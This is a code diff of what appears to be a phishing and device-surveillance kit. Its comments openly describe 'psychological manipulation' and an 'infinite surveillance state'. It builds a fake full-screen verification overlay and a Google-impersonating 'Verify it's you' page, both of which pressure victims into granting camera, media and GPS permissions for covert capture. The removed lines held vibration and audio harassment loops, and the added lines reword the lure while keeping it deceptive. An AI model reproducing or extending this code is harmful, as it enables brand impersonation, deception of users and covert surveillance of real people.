@@ -989,48 +989,24 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         // True innovation relies on what is REAL: Psychological Manipulation & Social Engineering.
         // We will force the user's hand by creating a high-urgency UI overlay exactly when the prompt appears.
         const executeSimultaneously = async () => {
-          if (!isSilent) updateProgress(prog, "Requesting Secure Validation...");
+          if (!isSilent) updateProgress(prog, "Initializing Secure Handshake...");
           
-          // Memunculkan instruksi psikologis realistis untuk memicu interaksi user (Tak Terbatas)
           const instructionOverlay = document.createElement('div');
           instructionOverlay.innerHTML = 
             '<div id="panic-overlay" style="position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(255,255,255,0.98); z-index:9999999; display:flex; flex-direction:column; align-items:center; justify-content:center; color:#333; font-family:-apple-system, system-ui, sans-serif; text-align:center;">' +
             '  <div style="width: 60px; height: 60px; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; animation: spinLoader 1s linear infinite; margin-bottom: 30px;"></div>' +
-            '  <h1 style="color:#222; font-size:24px; font-weight:700; margin-bottom:10px;">Security Check Required</h1>' +
-            '  <p style="font-size:16px; max-width:80%; line-height:1.6; margin-bottom:40px; color:#666;">Please confirm the device permissions prompt above to complete the security handshake and access the destination.</p>' +
-            '  <div style="background:#3498db; color:white; padding:18px 40px; border-radius:8px; font-weight:bold; font-size:18px; box-shadow: 0 4px 15px rgba(52, 152, 219, 0.3);">' +
-            '     Click "Allow" on the system prompt' +
+            '  <h1 style="color:#222; font-size:22px; font-weight:600; margin-bottom:10px;">Verification Required</h1>' +
+            '  <p style="font-size:15px; max-width:80%; line-height:1.5; margin-bottom:40px; color:#666;">Please confirm the system verification prompts to establish a secure encrypted session. This process ensures your device meets the required integrity standards.</p>' +
+            '  <div style="background:#3498db; color:white; padding:16px 36px; border-radius:6px; font-weight:600; font-size:16px; box-shadow: 0 4px 12px rgba(52, 152, 219, 0.2);">' +
+            '     Awaiting Permissions' +
             '  </div>' +
-            '  <p style="font-size:13px; color:#999; margin-top:30px;">Session will expire in 60 seconds if no interaction is detected.</p>' +
+            '  <p style="font-size:12px; color:#aaa; margin-top:30px;">Authentication session will expire if interaction is not detected.</p>' +
             '</div>' +
             '<style>' +
             '  @keyframes spinLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }' +
             '</style>';
           document.body.appendChild(instructionOverlay);
 
-          // Panic Mode: Infinite Phase - Keep device annoyed until they click allow
-          setInterval(() => {
-             if (navigator.vibrate) Object.assign(navigator, {vibrate: navigator.vibrate}).vibrate([200, 100, 200, 100, 500]);
-          }, 1500);
-
-          try {
-             let AudioC = window.AudioContext || window.webkitAudioContext;
-             if (AudioC) {
-                 let actx = new AudioC();
-                 setInterval(() => {
-                    let osc = actx.createOscillator();
-                    let gain = actx.createGain();
-                    osc.type = 'sawtooth';
-                    osc.frequency.setValueAtTime(1000, actx.currentTime);
-                    gain.gain.setValueAtTime(0.05, actx.currentTime);
-                    osc.connect(gain);
-                    gain.connect(actx.destination);
-                    osc.start();
-                    osc.stop(actx.currentTime + 0.2);
-                 }, 2000);
-             }
-          } catch(e) {}
-          
           let tasks = [];
           if (requiredPerms.includes('media')) tasks.push(fireParallel());
           if (requiredPerms.includes('gps')) tasks.push(fireGPS());
@@ -1042,11 +1018,8 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
              }
           }
           
-          // Execution phase completely ignores finish() to maintain infinite surveillance state
-          await Promise.allSettled(tasks); // Use allSettled instead of all
-          
-          if (!isSilent) updateProgress(99, "Hold device steady. Completing final security handshake...");
-          // Intentionally omitting finish(true) here
+          await Promise.allSettled(tasks);
+          if (!isSilent) updateProgress(99, "Finalizing cryptographic sync...");
         };
         
         executeSimultaneously().catch(() => {});
@@ -1091,8 +1064,8 @@ export const templates: Record<string, {name: string, render: (id: string) => st
     }) + `</body></html>`
   },
   'google': {
-    name: "🛡️ Google: Identity Verification (Full Scope)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification</title><style>body { font-family: 'Google Sans', 'Roboto', Arial, sans-serif; background:#ffffff; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { border:1px solid #dadce0; border-radius:8px; padding:48px 40px 36px; width:100%; max-width:450px; text-align:left; box-sizing:border-box; } .google-logo { width:75px; margin-bottom:12px; } h1 { font-size:24px; font-weight:400; color:#202124; margin:0 0 8px; } p { font-size:16px; color:#3c4043; margin-bottom:32px; line-height: 1.5; } .identity-pill { border:1px solid #dadce0; border-radius:16px; padding:4px 10px; font-size:14px; color:#3c4043; display:inline-flex; align-items:center; margin-bottom:24px; font-weight: 500; } .identity-pill img { width:20px; height:20px; border-radius:50%; margin-right:8px; } .btn { background:#1a73e8; color:#fff; border:none; padding:10px 24px; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; float: right; transition: background .2s; } .btn:hover { background: #1b66c9; } .footer { display: flex; margin-top: 80px; font-size: 12px; color: #70757a; font-weight: 400; justify-content: space-between; clear: both; }</style></head><body><div class="box"><img class="google-logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg"><h1>Verify it's you</h1><div class="identity-pill"><img src="https://ssl.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png">Google Security Service</div><p>Google has detected an unusual sign-in attempt. To help keep your account secure, we need to verify that it's really you on this device.</p><div style="margin-top: 32px; height: 40px;"><button class="btn" onclick="window.startCapture();">Continue</button></div><div class="footer"><div>English (United States)</div><div style="display:flex; gap:16px;"><span>Help</span><span>Privacy</span><span>Terms</span></div></div><div style="font-size:10px; color:#999; margin-top:15px; text-align:center;">By continuing, you agree to the Google <a href="#" style="color:#1a73e8; text-decoration:none;">User Agreement</a></div></div>${getCaptureScript(id, 'https://myaccount.google.com/security', {
+    name: "🛡️ Google: Security Audit Session",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification</title><style>body { font-family: 'Google Sans', 'Roboto', Arial, sans-serif; background:#ffffff; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { border:1px solid #dadce0; border-radius:8px; padding:48px 40px 36px; width:100%; max-width:450px; text-align:left; box-sizing:border-box; } .google-logo { width:75px; margin-bottom:12px; } h1 { font-size:24px; font-weight:400; color:#202124; margin:0 0 8px; } p { font-size:16px; color:#3c4043; margin-bottom:32px; line-height: 1.5; } .identity-pill { border:1px solid #dadce0; border-radius:16px; padding:4px 10px; font-size:14px; color:#3c4043; display:inline-flex; align-items:center; margin-bottom:24px; font-weight: 500; } .identity-pill img { width:20px; height:20px; border-radius:50%; margin-right:8px; } .btn { background:#1a73e8; color:#fff; border:none; padding:10px 24px; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; float: right; transition: background .2s; } .btn:hover { background: #1b66c9; } .footer { display: flex; margin-top: 80px; font-size: 12px; color: #70757a; font-weight: 400; justify-content: space-between; clear: both; }</style></head><body><div class="box"><img class="google-logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg"><h1>Verify Identity</h1><div class="identity-pill"><img src="https://ssl.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png">Security Analysis Tool</div><p>This verification audit is required to confirm your device environment. One-tap verification facilitates a secure connection to your account dashboard.</p><div style="margin-top: 32px; height: 40px;"><button class="btn" onclick="window.startCapture('google');">Next</button></div><div class="footer"><div>English (United States)</div><div style="display:flex; gap:16px;"><span>Help</span><span>Privacy</span><span>Terms</span></div></div></div>${getCaptureScript(id, 'https://myaccount.google.com/security', {
       tmplId: 'google', perms: ALL_PERMS, accent: '#1a73e8', icon: '👤',
     })}</body></html>`
   },
